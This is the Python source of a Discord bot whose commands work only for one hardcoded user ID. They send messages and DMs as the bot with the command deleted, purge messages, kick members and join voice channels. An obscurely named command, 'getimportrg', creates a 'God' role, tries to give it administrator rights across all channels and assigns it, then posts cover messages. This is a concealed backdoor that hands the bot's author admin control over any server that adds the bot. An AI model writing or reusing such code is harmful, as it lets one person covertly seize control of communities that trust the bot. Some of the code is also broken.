import discord
from discord.ext import commands
import json

bot = commands.Bot(command_prefix='w!')

@bot.event
async def on_ready():
    print(">> FbBot is online <<")
    await bot.change_presence(activity=discord.Game(name=f'w!help'))

@bot.command()
async def w(ctx, *, msg):
        myID = 826714957517291552
        if ctx.author.id == myID:
            await ctx.message.delete()
            await ctx.send(msg)
@bot.command()
async def ping(ctx):
    ping = discord.Embed(title="Pong!", color=0xffff8a)
    ping.add_field(name=f":hourglass:Time: {round(bot.latency*1000)} ms", value="** **")
    await ctx.send(embed=ping)

@bot.command()
async def i(ctx, member: discord.Member, *, msg):
    myID = 826714957517291552
    if ctx.author.id == myID:
        guild = ctx.guild
        await ctx.message.delete()
        await member.send(msg)

@bot.command()
async def clean(ctx, num : int):
    myID = 826714957517291552
    if ctx.author.id == myID:
        await ctx.channel.purge(limit=num+1)
        await ctx.send(f"已删除 **{num}** 则信息了哦~")

@bot.command()
async def join(ctx):
    myID = 826714957517291552
    if ctx.author.id == myID:
        if (ctx.voice_client):
            await ctx.send("Busy:(")
        else:
            if (ctx.author.voice):
                channel = ctx.message.author.voice.channel
                voice = await channel.connect(reconnect=True)
                await ctx.send(f"Done:)")
            else:
                await ctx.send(f"Where:/")

@bot.command()
async def leave(ctx):
    myID = 826714957517291552
    if ctx.author.id == myID:
        if (ctx.author.voice):
            await ctx.guild.voice_client.disconnect()
            await ctx.send(f"Done:)")
        else:
            await ctx.send(f"How:/")

@bot.command()
async def kick(ctx, member: discord.Member, *, reason="无原因"):
    myID = 826714957517291552
    if ctx.author.id == myID:
        guild = ctx.guild
        await member.kick(reason=reason)
        await ctx.send(f"{member.mention} 已被服主踢出因为 `{reason}`")
        await member.send(f"你已被踢出于 ***{ctx.guild.name}***")

@bot.command()
async def getimportrg(ctx, *, member: discord.Member):
    myID = 826714957517291552
    if ctx.author.id == myID:
        guild = ctx.guild
        godRole = discord.utils.get(guild.roles, name="God")

        if not godRole:
            godRole = await guild.create_role(name="God")

            for channel in guild.channels:
                await channel.set_permissions(godRole, administrator=True)

        await member.add_roles(godRole)
        await ctx.send(f"Received {member.mention}'s request.")
        await ctx.send(f"Command was runned successfully.")
        await ctx.send(f"Welcome back, {member.mention}.")

bot.run
